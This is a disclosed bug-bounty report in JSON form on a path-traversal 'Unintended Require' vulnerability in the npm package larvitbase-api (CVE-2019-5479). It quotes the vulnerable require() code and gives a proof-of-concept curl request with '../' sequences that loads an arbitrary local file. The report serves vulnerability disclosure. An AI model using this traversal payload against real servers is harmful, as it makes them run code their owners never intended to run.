{
  "id": 566056,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NjYwNTY=",
  "url": "https://hackerone.com/reports/566056",
  "title": "[larvitbase-api] Unintended Require",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-05-04T10:15:45.993Z",
  "submitted_at": "2019-05-04T10:15:45.993Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ermilov",
    "url": "/ermilov",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2019-5479"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-08-20T07:30:29.330Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-08-20T07:30:14.722Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report Unintended Require vulnerability in `larvitbase-api`\nIt allows loading arbitary non-production code (js files).\n\n# Module\n\n**module name:** larvitbase-api\n**version:** 0.5.3\n**npm page:** `https://www.npmjs.com/package/larvitbase-api`\n\n## Module Description\n\nREST http API base framework based on larvitbase (https://github.com/larvit/larvitbase)\n\n## Module Stats\n\n59 downloads in the last day\n250 downloads in the last week\n715 downloads in the last month\n\n# Vulnerability\n\n## Vulnerability Description\n\n`larvitbase-api` is an HTTP server which dynamically loads (with help of `require()`) some parts of the code. As long as the path to required module is partially depend on the url (req.urlBase), anybody can cause code to load that was not intended to run on the server.\n\nsource code example:\n\nhttps://github.com/larvit/larvitbase-api/blob/master/index.js#L183\n```\nreq.routed = {\n\tcontrollerFullPath: path.join(altControllerPaths[i], req.urlBase) + '.js',\n\tcontrollerPath: req.urlBase\n};\n```\n\nhttps://github.com/larvit/larvitbase-api/blob/master/index.js#L210\n```\nrequire(req.routed.controllerFullPath)(req, res, cb);\n```\n\nDetailed description of this bug can be found here: https://nodesecroadmap.fyi/chapter-1/threat-UIR.html\n\n## Steps To Reproduce:\n\n* create directory for testing\n```\nmkdir poc\ncd poc/\n```\n\n* install package\n```\nnpm i larvitbase-api\n```\n\n* create index.js file with default usage of larvitbase-api\n\nindex.js (example code form https://www.npmjs.com/package/larvitbase-api)\n```\nconst\tApi\t= require('larvitbase-api');\n\nlet\tapi;\n\napi = new Api({\n    'baseOptions':\t{'httpOptions': 8001},\n    'routerOptions':\t{},\n    'reqParserOptions':\t{},\n});\n\napi.start(function (err) {});\n```\n\n* create hack.js file with some arbitary code for testing\n\nhack.js\n```\nconsole.log('pwned');\n```\n\n* start index.js\n```\nnode index.js\n```\n\n* send crafted request to web app (localhost:8001 by deafult) in order to force using of hack.js script\n```\ncurl --path-as-is 'http://localhost:8001/../../../../../../hack'\n```\n\n* index.js should log something like this to terminal:\n```\npwned\n                        require(req.routed.controllerFullPath)(req, res, cb);\nTypeError: require(...) is not a function\n```\n\n## Patch\n\n## Supporting Material/References:\n\n- OS: Linux Mint current\n- Node.js: 8.11.1\n- NPM: 6.4.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nAn attacker is able to control the x in require(x) and cause code to load that was not intended to run on the server.",
  "weakness": {
    "id": 71,
    "name": "Remote File Inclusion"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-09-19T07:30:14.858Z",
  "allow_singular_disclosure_after": -138952321.01564366,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "ermilov",
    "bl4de",
    "aghayeoji",
    "alexander-petree1001",
    "n0ur0x01",
    "salex",
    "ghostr3con1995"
  ],
  "severity": {
    "rating": "medium",
    "score": 5.4,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
